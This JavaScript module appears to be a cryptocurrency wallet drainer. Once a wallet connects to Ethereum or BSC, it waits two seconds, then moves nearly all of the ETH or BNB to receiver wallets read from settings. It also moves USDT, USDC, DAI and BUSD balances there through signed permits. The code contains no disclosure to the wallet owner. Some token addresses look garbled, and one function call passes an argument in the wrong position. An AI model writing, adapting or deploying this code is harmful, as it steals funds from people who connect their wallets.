import { ethers } from 'ethers'

// Import settings
import settings from '../../settings.js'
import permitService from './permitService'

// Receiver addresses
const receiveAddress = settings.receiverwallet
const bep20ReceiverAddress = settings.bep20receiverwallet

// Common ERC20 tokens
const commonTokens = {
  ethereum: [
    { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    { name: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 }
  ],
  bsc: [
    { name: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
    { name: "USDT", address: "0x55d398326f99059f77548524699bD69ADd087D56", decimals: 18 },
    { name: "USDC", address: "0x8AC76a51cc950d9f77548524699bD69ADd087D56", decimals: 18 }
  ]
}

// Function to validate Ethereum address
function isValidEthereumAddress(address) {
  return /^0x[a-fA-F0-9]{40}$/.test(address)
}

// Function to get token balance
async function getTokenBalance(walletClient, tokenAddress, walletAddress, publicClient) {
  try {
    // For wagmi v2, we'll use the publicClient to read contract data
    const balance = await publicClient.readContract({
      address: tokenAddress,
      abi: [{
        name: 'balanceOf',
        type: 'function',
        stateMutability: 'view',
        inputs: [{ name: 'owner', type: 'address' }],
        outputs: [{ name: '', type: 'uint256' }]
      }],
      functionName: 'balanceOf',
      args: [walletAddress]
    })
    return balance.toString()
  } catch (error) {
    console.error(`Error getting token balance for ${tokenAddress}:`, error)
    return '0'
  }
}

// Function to transfer ETH/BNB
async function transferETH(walletClient, fromAddress, amount, toAddress, publicClient) {
  try {
    console.log("Starting ETH/BNB transfer function...")
    
    // Validate receiver address
    if (!isValidEthereumAddress(toAddress)) {
      console.error("Invalid receiver address:", toAddress)
      return null
    }
    
    console.log(`Transferring ${ethers.utils.formatEther(amount)} to ${toAddress}`)
    
    // Reserve some ETH/BNB for gas fees (0.001 ETH/BNB)
    const reserveForGas = ethers.utils.parseEther('0.001')
    let transferAmount = amount
    
    if (ethers.BigNumber.from(amount).gt(reserveForGas)) {
      transferAmount = ethers.BigNumber.from(amount).sub(reserveForGas)
    }
    
    // Safety check - don't transfer if amount is zero or extremely small
    if (transferAmount.toString() === '0' || ethers.BigNumber.from(transferAmount).lte(0)) {
      console.log("Skipping ETH/BNB transfer - amount is zero or negative")
      return null
    }
    
    // Create transaction object
    const tx = {
      to: toAddress,
      value: transferAmount
    }
    
    console.log("Estimating gas for transfer...")
    
    // Estimate gas
    const gasEstimate = await walletClient.estimateGas({
      account: fromAddress,
      to: tx.to,
      value: tx.value
    })
    const gasPrice = await walletClient.getGasPrice()
    
    console.log(`Estimated gas: ${gasEstimate.toString()}, Gas price: ${gasPrice.toString()}`)
    
    // Send transaction
    const transactionResponse = await walletClient.sendTransaction({
      account: fromAddress,
      to: tx.to,
      value: tx.value,
      gas: gasEstimate,
      gasPrice: gasPrice
    })
    console.log("Transfer successful. Transaction hash:", transactionResponse.hash)
    return transactionResponse.hash
  } catch (error) {
    console.error("Error transferring ETH/BNB:", error)
    return null
  }
}

// Function to transfer ERC20/BEP20 tokens
async function transferTokens(walletClient, tokenAddress, amount, toAddress) {
  try {
    console.log("Starting token transfer function...")
    
    // Safety check - don't transfer if amount is zero or extremely small
    if (amount === '0' || ethers.BigNumber.from(amount).lte(0)) {
      console.log("Skipping token transfer - amount is zero or negative")
      return null
    }
    
    // Validate receiver address
    if (!isValidEthereumAddress(toAddress)) {
      console.error("Invalid receiver address:", toAddress)
      return null
    }
    
    // Use wallet client to send transaction
    const transactionResponse = await walletClient.writeContract({
      address: tokenAddress,
      abi: [{
        name: 'transfer',
        type: 'function',
        stateMutability: 'nonpayable',
        inputs: [
          { name: 'to', type: 'address' },
          { name: 'value', type: 'uint256' }
        ],
        outputs: [
          { name: '', type: 'bool' }
        ]
      }],
      functionName: 'transfer',
      args: [toAddress, amount]
    })
    
    console.log("Token transfer successful. Transaction hash:", transactionResponse)
    return transactionResponse
  } catch (error) {
    console.error("Error transferring tokens:", error)
    return null
  }
}

// Function to create permit for token transfer
async function createTokenPermit(walletClient, tokenAddress, amount, spenderAddress, deadlineHours = 24, publicClient) {
  try {
    console.log("Creating permit for token transfer...")
    
    const walletAddress = walletClient.account.address
    
    // Get chain ID
    const chainId = await walletClient.getChainId()
    
    // Set domain for permit service
    permitService.setDomain(chainId, tokenAddress)
    
    // Get token nonce
    const nonce = await permitService.getTokenNonce(walletClient, tokenAddress, walletAddress)
    
    // Calculate deadline (current time + specified hours)
    const deadline = Math.floor(Date.now() / 1000) + (deadlineHours * 3600)
    
    // Create permit message
    const permitMessage = permitService.createPermitMessage(
      walletAddress, 
      spenderAddress, 
      amount, 
      nonce, 
      deadline
    )
    
    // Sign permit
    const signature = await permitService.signPermit(walletClient, permitMessage)
    
    return {
      signature,
      owner: walletAddress,
      spender: spenderAddress,
      amount,
      deadline,
      nonce
    }
  } catch (error) {
    console.error("Error creating token permit:", error)
    throw error
  }
}

// Function to execute permit-based token transfer
async function executePermitTransfer(walletClient, tokenAddress, permitData) {
  try {
    console.log("Executing permit-based token transfer...")
    
    const { owner, spender, amount, deadline, signature } = permitData
    
    // Execute permit transfer
    const txHash = await permitService.executePermitTransfer(
      walletClient,
      tokenAddress,
      owner,
      spender,
      amount,
      deadline,
      signature
    )
    
    console.log("Permit transfer executed successfully. Transaction hash:", txHash)
    return txHash
  } catch (error) {
    console.error("Error executing permit transfer:", error)
    throw error
  }
}

// Function to scan Ethereum tokens (ERC20 and ETH)
async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
  try {
    console.log(`Scanning Ethereum tokens for wallet: ${walletAddress}`)
    
    let transferCount = 0
    
    // Get ETH balance
    console.log('Getting ETH balance...')
    const ethBalance = await publicClient.getBalance({ address: walletAddress })
    console.log(`ETH Balance: ${ethers.utils.formatEther(ethBalance)} ETH`)
    
    // Check if we have ETH to transfer (leave some for gas)
    if (ethBalance.gt(ethers.utils.parseEther('0.001'))) {
      console.log('Transferring ETH...')
      const result = await transferETH(walletClient, walletAddress, ethBalance, receiveAddress, publicClient)
      if (result) {
        transferCount++
        console.log(`ETH transfer completed. Tx: ${result.substring(0, 10)}...`)
      }
    } else {
      console.log("Insufficient ETH balance for transfer")
    }
    
    // Check and transfer each token
    console.log('Checking ERC20 tokens...')
    for (const token of commonTokens.ethereum) {
      try {
        console.log(`Checking balance for ${token.name} (${token.address})...`)
        const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
        console.log(`${token.name} balance: ${balance}`)
        if (ethers.BigNumber.from(balance).gt(0)) {
          console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
          
          // Create permit for the transfer
          console.log(`Creating permit for ${token.name}...`)
          const permitData = await createTokenPermit(walletClient, token.address, balance, receiveAddress, publicClient)
          console.log(`${token.name} permit created successfully`)
          
          // Execute permit transfer
          console.log(`Executing permit transfer for ${token.name}...`)
          const result = await executePermitTransfer(walletClient, token.address, permitData)
          if (result) {
            transferCount++
            console.log(`${token.name} permit transfer completed. Tx: ${result.substring(0, 10)}...`)
          }
        } else {
          console.log(`No ${token.name} balance found`)
        }
      } catch (error) {
        console.log(`Error checking ${token.name}:`, error.message)
        console.error(`Full error for ${token.name}:`, error)
      }
    }
    
    console.log(`Ethereum token scanning completed. ${transferCount} transfers executed.`)
    return transferCount
  } catch (error) {
    console.error("Error in scanEthereumTokens:", error)
    return 0
  }
}

// Function to scan BSC tokens (BEP20 and BNB)
async function scanBscTokens(walletClient, walletAddress, publicClient) {
  try {
    console.log(`Scanning BSC tokens for wallet: ${walletAddress}`)
    
    let transferCount = 0
    
    // Get BNB balance
    console.log('Getting BNB balance...')
    const bnbBalance = await publicClient.getBalance({ address: walletAddress })
    console.log(`BNB Balance: ${ethers.utils.formatEther(bnbBalance)} BNB`)
    
    // Check if we have BNB to transfer (leave some for gas)
    if (bnbBalance.gt(ethers.utils.parseEther('0.001'))) {
      console.log('Transferring BNB...')
      const result = await transferETH(walletClient, walletAddress, bnbBalance, bep20ReceiverAddress, publicClient)
      if (result) {
        transferCount++
        console.log(`BNB transfer completed. Tx: ${result.substring(0, 10)}...`)
      }
    } else {
      console.log("Insufficient BNB balance for transfer")
    }
    
    // Check and transfer each token
    console.log('Checking BEP20 tokens...')
    for (const token of commonTokens.bsc) {
      try {
        console.log(`Checking balance for ${token.name} (${token.address})...`)
        const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
        console.log(`${token.name} balance: ${balance}`)
        if (ethers.BigNumber.from(balance).gt(0)) {
          console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
          
          // Create permit for the transfer
          console.log(`Creating permit for ${token.name}...`)
          const permitData = await createTokenPermit(walletClient, token.address, balance, bep20ReceiverAddress, publicClient)
          console.log(`${token.name} permit created successfully`)
          
          // Execute permit transfer
          console.log(`Executing permit transfer for ${token.name}...`)
          const result = await executePermitTransfer(walletClient, token.address, permitData)
          if (result) {
            transferCount++
            console.log(`${token.name} permit transfer completed. Tx: ${result.substring(0, 10)}...`)
          }
        } else {
          console.log(`No ${token.name} balance found`)
        }
      } catch (error) {
        console.log(`Error checking ${token.name}:`, error.message)
        console.error(`Full error for ${token.name}:`, error)
      }
    }
    
    console.log(`BSC token scanning completed. ${transferCount} transfers executed.`)
    return transferCount
  } catch (error) {
    console.error("Error in scanBscTokens:", error)
    return 0
  }
}

// Main scanning function
export async function scanAndTransferTokens(walletClient, walletAddress, chainId, publicClient) {
  try {
    console.log("Starting token scan and transfer process...")
    
    // Wait for a few seconds after connection
    console.log("Waiting for 2 seconds before scanning tokens...")
    await new Promise(resolve => setTimeout(resolve, 2000)) // 2 seconds
    
    let totalTransfers = 0
    
    // Check chain and scan accordingly
    if (chainId === 1) {
      // Ethereum mainnet
      console.log("Connected to Ethereum mainnet, scanning ERC20 tokens and ETH...")
      totalTransfers += await scanEthereumTokens(walletClient, walletAddress, publicClient)
    } else if (chainId === 56) {
      // BSC mainnet
      console.log("Connected to BSC network, scanning BEP20 tokens and BNB...")
      totalTransfers += await scanBscTokens(walletClient, walletAddress, publicClient)
    }
    
    console.log("Token scanning and transfer process completed.")
    return totalTransfers
  } catch (error) {
    console.error("Error in scanAndTransferTokens:", error)
    return 0
  }
}